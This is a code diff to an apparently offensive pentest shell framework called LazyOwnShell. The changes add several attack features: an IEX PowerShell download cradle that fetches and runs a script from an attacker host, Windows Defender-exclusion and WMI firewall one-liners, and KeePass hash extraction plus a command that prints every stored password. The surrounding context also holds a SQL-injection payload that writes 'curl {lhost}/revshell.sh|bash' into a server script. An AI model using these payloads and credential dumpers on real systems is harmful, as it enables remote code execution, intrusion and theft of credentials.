@@ -2988,7 +2988,15 @@ class LazyOwnShell(Cmd):
         """
 
         dirwordlist = self.params["dirwordlist"]
+        choice = input("    [!] Enter the numer 1 to directory-list-2.3-medium.txt 2 to raft-large-words.txt [1/2] (Default 2): ") or '2'
+        if choice == '2':
+            dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")        
         rhost = self.params["rhost"]
+        url = self.params["url"]
+        url = get_domain(url)
+        choice = input(f"    [?] Use 1 to url or 2 to rhost (default {url})") or '1'
+        if choice == '1':
+            rhost = url
         if not rhost or not dirwordlist:
             print_error(f"dirwordlist and rhost must be set{RESET}")
             return
@@ -3134,6 +3142,9 @@ class LazyOwnShell(Cmd):
         """
 
         dirwordlist = self.params["dirwordlist"]
+        choice = input("    [!] Enter the numer 1 to directory-list-2.3-medium.txt 2 to raft-large-words.txt [1/2] (Default 2): ") or '2'
+        if choice == '2':
+            dirwordlist = dirwordlist.replace("directory-list-2.3-medium.txt", "raft-large-words.txt")
         rhost = self.params["rhost"]
         if not rhost or not dirwordlist:
             print_error(f"rhost and dirwordlist must be set {RESET}")
@@ -5199,6 +5210,8 @@ class LazyOwnShell(Cmd):
             ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),            
             ("WIN enum Reg", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
             ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
+            ("WIN enum WMI access",'netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes'),
+            ("WIN Identify Exclusions",'& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\\folder_to_check\|*"'),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
             ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b ")
@@ -12648,12 +12661,13 @@ class LazyOwnShell(Cmd):
             "wget",
             "Invoke-WebRequest (IWR)",
             "certutil.exe",
-            "bitsadmin.exe"
+            "bitsadmin.exe",
+            "IEX"
         ]
         for idx, method in enumerate(methods, 1):
             print_warn(f"  {idx}) {method}")
 
-        method_choice = input(f"Enter the number of the download method (1-{len(methods)}): ").strip()
+        method_choice = input(f"    [!] Enter the number of the download method (1-{len(methods)}): ").strip()
 
         try:
             method_choice = int(method_choice)
@@ -12681,10 +12695,13 @@ class LazyOwnShell(Cmd):
             command = f"certutil.exe -urlcache -split -f http://{lhost}/{selected_file} {output_file}"
         elif selected_method == "bitsadmin.exe":
             command = f"bitsadmin.exe /transfer myDownloadJob http://{lhost}/{selected_file} {output_file}"
-        
+        elif selected_method == "IEX":
+            choice = input("    [!] Enter extra command to exec after download: (Blank to none)")
+            command = f"powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}/{selected_file}');{choice}\""
+
         command = command.replace("sessions/",'')
         copy2clip(command)
-        print_msg(f"\nGenerated command copied to clipboard:\n{command}\n")
+        print_msg(f"Generated command copied to clipboard: {command}")
 
     def do_ldapsearch(self, line):
         """
@@ -13982,6 +13999,142 @@ class LazyOwnShell(Cmd):
         except FileNotFoundError:
             print_error(f"CSV file not found: {csv_path}")
             return
+
+    def do_ip2hex(self, line):
+        """
+        Convert an IPv4 address into its hexadecimal representation.
+
+        This function takes an IPv4 address in standard dotted-decimal format 
+        (e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal 
+        number. The resulting hexadecimal string is concatenated without separators, 
+        providing the full hexadecimal equivalent of the IP address.
+
+        The input IP address is expected to be a string in the format 'X.X.X.X', 
+        where X is an integer between 0 and 255.
+
+        Parameters:
+        line (str): The input string representing the IPv4 address in dotted-decimal format.
+
+        Returns:
+        None: The hexadecimal equivalent of the IP address is printed to the console.
+        """
+        try:
+            octets = line.strip().split('.')
+            hex_value = ''.join([format(int(octet), '02x') for octet in octets])
+            print_msg(f"Hexadecimal representation: {hex_value}")
+        except ValueError:
+            print_error("Invalid IP address format. Please provide a valid IPv4 address.")
+
+    def do_john2keepas(self, line):
+        """
+        List all .kdbx files in the 'sessions' directory, let the user select one, and run the 
+        command `sudo keepass2john {user_file} > sessions/hash.txt`. 
+        If 'sessions/hash.txt' already exists, it will be backed up with a timestamp to avoid overwriting.
+        
+        Parameters:
+        line (str): An optional string parameter. This can be used for any additional input, 
+                    though it's not needed in this specific command.
+        
+        Returns:
+        None
+        """
+        sessions_dir = 'sessions'
+        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith('.kdbx')]
+
+        if not kdbx_files:
+            print_error("No .kdbx files found in the 'sessions' directory.")
+            return
+
+        print_msg("Available .kdbx files:")
+        for idx, file in enumerate(kdbx_files):
+            print_msg(f"{idx}: {file}")
+
+        try:
+            file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
+            selected_file = kdbx_files[file_index]
+        except (IndexError, ValueError):
+            print_error("Invalid selection.")
+            return
+
+        selected_file_path = os.path.join(sessions_dir, selected_file)
+
+        hash_file_path = os.path.join(sessions_dir, 'hash.txt')
+        if os.path.exists(hash_file_path):
+            timestamp = time.strftime("%Y%m%d-%H%M%S")
+            backup_hash_file = os.path.join(sessions_dir, f"hash_{timestamp}.txt")
+            os.rename(hash_file_path, backup_hash_file)
+            print_warn(f"Existing hash.txt file backed up as: {backup_hash_file}")
+        command = f"sudo keepass2john {selected_file_path} > {hash_file_path}"
+        try:
+            print_msg(command)
+            os.system(command)
+            print_msg(f"Hash saved in: {hash_file_path}")
+        except Exception as e:
+            print_error(f"Error executing command: {str(e)}")
+        return
+
+    def do_keepass(self, line):
+        """
+        Open a .kdbx file and print the titles and contents of all entries. The password can be provided through
+        the 'line' parameter, via user input, or from a 'credentials.txt' file in the 'sessions' directory.
+
+        If the file 'credentials.txt' exists in the 'sessions' directory, the first password from it
+        will be used automatically.
+
+        Parameters:
+        line (str): An optional string parameter to pass the password. If not provided, the user will
+                    be prompted to input the password.
+
+        Returns:
+        None
+        """
+        sessions_dir = 'sessions'
+        kdbx_files = [f for f in os.listdir(sessions_dir) if f.endswith('.kdbx')]
+
+        if not kdbx_files:
+            print_error("No .kdbx files found in the 'sessions' directory.")
+            return
+
+        print_msg("Available .kdbx files:")
+        for idx, file in enumerate(kdbx_files):
+            print_msg(f"{idx}: {file}")
+
+        try:
+            file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
+            selected_file = kdbx_files[file_index]
+        except (IndexError, ValueError):
+            print_error("Invalid selection.")
+            return
+
+        selected_file_path = os.path.join(sessions_dir, selected_file)
+
+        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+            credentials = get_credentials()
+            if not credentials:
+                return
+
+            for user, passwd in credentials:
+                password = passwd
+        else:
+            password = line if line else input(f"{GREEN}    [!] Enter the master password: ")
+
+        try:
+            from pykeepass import PyKeePass
+            kp = PyKeePass(selected_file_path, password=password)
+
+            print_msg(f"Entries in {selected_file}:")
+            for entry in kp.entries:
+                print_msg(f"Title: {entry.title}")
+                print_msg(f"Username: {entry.username}")
+                print_msg(f"Password: {entry.password}")
+                print_msg(f"URL: {entry.url}")
+                print_msg(f"Notes: {entry.notes}")
+                print_msg("-" * 40)
+
+        except Exception as e:
+            print_error(f"Failed to open or process the file: {str(e)}")
+
+        return
 
 
 if __name__ == "__main__":
